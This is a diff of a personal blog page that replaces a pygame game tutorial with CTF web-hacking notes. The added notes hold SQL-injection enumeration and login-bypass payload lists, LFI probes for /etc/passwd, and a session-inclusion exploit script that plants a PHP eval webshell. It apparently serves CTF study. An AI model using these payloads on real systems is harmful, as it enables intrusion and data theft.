@@ -17,26 +17,22 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/02/07/python实战/"/>
+    <link rel="canonical" href="http://example.com/2024/03/11/ctf_web/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="《外星人入侵小游戏开发》">
+        <meta name="description" content="CTF_WEBSQL注入：1、数据库为mysql的爆库、爆表、爆字段、爆值的语句： 爆库： 1union select 1,2,3,database();#查看此处有多字段  爆表： 1union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); #">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python实战">
-<meta property="og:url" content="http://example.com/2024/02/07/Python%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:title" content="敬请T期待">
+<meta property="og:url" content="http://example.com/2024/03/11/CTF_WEB/index.html">
 <meta property="og:site_name" content="敬请T期待">
-<meta property="og:description" content="《外星人入侵小游戏开发》">
+<meta property="og:description" content="CTF_WEBSQL注入：1、数据库为mysql的爆库、爆表、爆字段、爆值的语句： 爆库： 1union select 1,2,3,database();#查看此处有多字段  爆表： 1union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); #">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp">
-<meta property="article:published_time" content="2024-02-07T02:17:45.000Z">
-<meta property="article:modified_time" content="2024-03-10T02:36:58.067Z">
+<meta property="article:published_time" content="2024-03-11T13:59:38.432Z">
+<meta property="article:modified_time" content="2024-03-11T14:44:12.185Z">
 <meta property="article:author" content="kingwempity">
-<meta property="article:tag" content="Python">
-<meta property="article:tag" content="实战项目">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp">
     
     
     <!--- Icon Part-->
@@ -47,8 +43,6 @@
     <!--- Page Info-->
     
     <title>
-        
-            Python实战 -
         
         KingWempity&#39;s Blog
     </title>
@@ -559,7 +553,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Python实战</h1>
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3"></h1>
                 </div>
             
             </div>
@@ -580,62 +574,31 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-02-07 10:17:45</span>
-        <span class="mobile">2024-02-07 10:17:45</span>
+        <span class="desktop">2024-03-11 21:59:38</span>
+        <span class="mobile">2024-03-11 21:59:38</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-03-10 10:36:58</span>
-            <span class="mobile">2024-03-10 10:36:58</span>
+            <span class="desktop">2024-03-11 22:44:12</span>
+            <span class="mobile">2024-03-11 22:44:12</span>
             <span class="hover-info">Updated</span>
         </span>
     
 
     
-        <span class="article-categories article-meta-item">
-            <i class="fa-regular fa-folders"></i>&nbsp;
-            <ul>
-                
-                
-                    
-                        
-                        <li>
-                            <a href="/categories/Languages/">Languages</a>&nbsp;
-                        </li>
-                    
-                    
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/Python/">Python</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/">实战项目</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
     
 
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.5k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>927 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
         </span>
     
     
@@ -654,49 +617,100 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <meta name="referrer" content="no-referrer">
+            <h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
+<p><strong>爆库：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="外星人入侵游戏开发"><a href="#外星人入侵游戏开发" class="headerlink" title="外星人入侵游戏开发"></a>外星人入侵游戏开发</h2><p>一、开发框架</p>
-<p>总文件：alien_invasion</p>
-<p>包含文件：</p>
-<ul>
-<li>image文件</li>
-<li>alien_invasion.py</li>
-<li>game_functions.py</li>
-<li>ship.py</li>
-<li>settings.py</li>
-<li>bullet.py</li>
+<p><strong>爆表：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆字段：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆值：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
+<p>CTFshow&#x2F; easy_include</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代码解释：</p>
+<blockquote>
+<p>观察cookie，发现自动开启了session，直接session文件包含</p>
+<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
+</blockquote>
+<p>EXP:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>使用php协议</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看PHP下的文夹使用ls</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>查看文件日志的文件夹</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
+<p> ’ or 1&#x3D;1 #</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号： admin<br> 密码：admin</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin<br> 密码：admin888</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p> 账号：admin</p>
+<p> 密码：域名名</p>
+<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or “a”&#x3D;”a<br>  ‘)or(‘a’&#x3D;’a<br> or 1&#x3D;1-<br> ‘or 1&#x3D;1-<br> a’or’1&#x3D;1-<br> “or 1&#x3D;1-<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or’&#x3D;’’<br> ‘or’&#x3D;’or’<br> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor ## PHP万能密码</p>
+<p> ‘or’&#x3D;’or’</p>
+<p> ‘or 1&#x3D;1 &#x2F;* 字符型 GPC是否开都可以使用*&#x2F;</p>
+<p> User: something<br> Pass: ’ OR ‘1’&#x3D;’1</p>
+<p> jsp 万能密码</p>
+<p> 1’or’1’&#x3D;’1</p>
+<p> admin’ OR 1&#x3D;1&#x2F;*</p>
+<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
+</blockquote>
+<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
+<p>a’ or true #</p>
+<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
+</blockquote>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
+<hr>
+<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
+<blockquote>
+<ol>
+<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
+<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
+<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
+<li><code>-</code>：匹配破折号字符。</li>
+<li><code>\\</code>：匹配反斜杠字符。</li>
+<li><code>\/</code>：匹配正斜杠字符。</li>
+<li><code>\\*</code>：匹配星号字符。</li>
+<li><code>\&lt;</code>：匹配单词的开头。</li>
+<li><code>\&gt;</code>：匹配单词的结尾。</li>
+<li><code>\!</code>：匹配感叹号字符。</li>
+<li><code>x</code>：匹配字母 ‘x’。</li>
+<li><code>hex</code>：匹配字符串 ‘hex’。</li>
+<li><code>\(</code>：匹配左括号。</li>
+<li><code>\)</code>：匹配右括号。</li>
+<li><code>\+</code>：匹配加号。</li>
+<li><code>select</code>：匹配字符串 ‘select’。</li>
 </ul>
-<hr>
-<p><strong>alien.invasion.py</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#alien_invasion.py</span></span><br><span class="line"><span class="comment">#一系列整个游戏都要用到的对象,游戏的主循环</span></span><br><span class="line"><span class="keyword">import</span> pygame<span class="comment">#模块pygame包含开发游戏所需的功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">import</span> game_functions <span class="keyword">as</span> gf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_game</span>():</span><br><span class="line">    <span class="comment">#初始化游戏并创建一个屏幕对象</span></span><br><span class="line">    pygame.init()<span class="comment">#初始化背景设置</span></span><br><span class="line">    ai_settings = Settings()</span><br><span class="line">    screen = pygame.display.set_mode((ai_settings.screen_width,ai_settings.screen_height))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我们调用pygame.display.set_mode()来创建一个名为screen的显示窗口，这个游戏的所有图形元素都将在其中绘制。</span></span><br><span class="line"><span class="string">    通过将这些尺寸值传递给pygame.display.set_mode()，我们创建了一个宽1200像素、高800像素的游戏窗口</span></span><br><span class="line"><span class="string">    （你可以根据自己的显示器尺寸调整这些值）。</span></span><br><span class="line"><span class="string">    surface是屏幕的一部分，用于显示游戏元素。在这个游戏中，每个元素（如外星人或飞船）都是一个surface。</span></span><br><span class="line"><span class="string">    display.set_mode()返回的surface表示整个游戏窗口。</span></span><br><span class="line"><span class="string">    我们激活游戏的动画循环后，每经过一次循环都将自动重绘这个surface。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置背景色</span></span><br><span class="line">    bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建一艘飞船</span></span><br><span class="line">    ship = Ship(ai_settings,screen)<span class="comment">#创建一个名为ship的Ship实例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#开始游戏的主循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        gf.check_events(ship)</span><br><span class="line">        gf.ship.updat()<span class="comment">#玩家输入时，飞船位置更新</span></span><br><span class="line">        gf.update_screen(ai_settings,screen,ship)</span><br><span class="line"></span><br><span class="line">run_game()</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<p><strong>game_functions.py</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#game_functions.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;包含一系列函数，由它完成游戏的大部分工作.</span></span><br><span class="line"><span class="string">check_events()检测相关事件，按键的按下与松开，并且辅助check_keydown_events()和check_keyup_events()处理事件</span></span><br><span class="line"><span class="string">包含模块update_screen()用于每次执行主循环时的屏幕绘制</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keydown_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键按下</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RITGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keyup_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键松开</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> event.key ==pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_events</span>(<span class="params">event,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> events <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> events.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> == pygame.KEYDOWN:<span class="comment">#鼠标键按下时</span></span><br><span class="line">            check_keydown_events(event,ship)</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> ==pygame.KEYUP:<span class="comment">#鼠标键松开时</span></span><br><span class="line">            check_keyup_events(event,ship)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_screen</span>(<span class="params">ai_settings,screen,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，并切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 每次循环都重新绘制屏幕</span></span><br><span class="line">    screen.fill(ai_settings.bg_color)  <span class="comment"># 这个方法只接受一个实参：一种颜色。</span></span><br><span class="line">    ship.blitme()  <span class="comment"># 将飞船绘制到屏幕</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 让最近绘制的屏幕可见</span></span><br><span class="line">    pygame.display.flip()  <span class="comment"># 命令Pygame让最近绘制的屏幕可见。营造平滑移动的效果。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<p><strong>ship.py</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Ship.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;包含__init__()、管理飞船位置的方法update()以及在屏幕上绘制飞船的方法blitme()&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ship</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,ai_settings,screen</span>):<span class="comment">#screen指定了要将飞船绘制到什么地方</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化飞船并设置其初始位置&quot;&quot;&quot;</span></span><br><span class="line">        self.screen = screen</span><br><span class="line">        self.ai_settings = ai_settings</span><br><span class="line">        <span class="comment">#加载飞船图像并获取其外接矩形</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;.\images\ship.bmp&#x27;</span>)</span><br><span class="line">        self.rect = self.image.get_rect()<span class="comment">#飞船图像</span></span><br><span class="line">        self.screen_rect = screen.get_rect()<span class="comment">#屏幕</span></span><br><span class="line">        <span class="comment">#将每艘新飞船放在屏幕底部中央</span></span><br><span class="line">        self.rect.centerx = self.screen_rect.centerx<span class="comment">#self.rect.centerx（飞船中心的x坐标）</span></span><br><span class="line">        self.rect.bottom = self.screen_rect.bottom<span class="comment">#self.rect.bottom（飞船下边缘的y坐标）</span></span><br><span class="line">        <span class="comment">#在飞船的属性center中存储小数值</span></span><br><span class="line">        self.center = <span class="built_in">float</span>(self.rect.centerx)</span><br><span class="line">        <span class="comment">#移动标志</span></span><br><span class="line">        self.moving_right = <span class="literal">False</span>  <span class="comment">#向右移动标志</span></span><br><span class="line">        self.mobing_left = <span class="literal">False</span> <span class="comment">#向左移动标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据移动标志调整飞船的位置&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新飞船的center值，而不是rect</span></span><br><span class="line">        <span class="comment">#self.rect.right返回飞船外接矩形的右边缘的x坐标，如果这个值小于self.screen_rect.right的值，就说明飞船未触及屏幕右边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">            self.rect.centerx += self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#如果rect的左边缘的x坐标大于零，就说明飞船未触及屏幕左边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line">            self.rect.centerx -= self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#根据self.rect.center更新rect对象</span></span><br><span class="line">        self.rect.centerx = self.center</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">blitme</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在指定位置绘制飞船&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<p>settings.py</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#setting.py</span></span><br><span class="line"><span class="comment">#包含Setting类，只含有__init__()，初始化控制游戏外观和飞船的速度属性,射击子弹的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Settings</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;存储《外星入侵》的所有设置的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#初始化游戏的设置</span></span><br><span class="line">        <span class="comment">#屏幕设置</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span></span><br><span class="line">        self.screen_height = <span class="number">800</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)<span class="comment">#灰色</span></span><br><span class="line">        <span 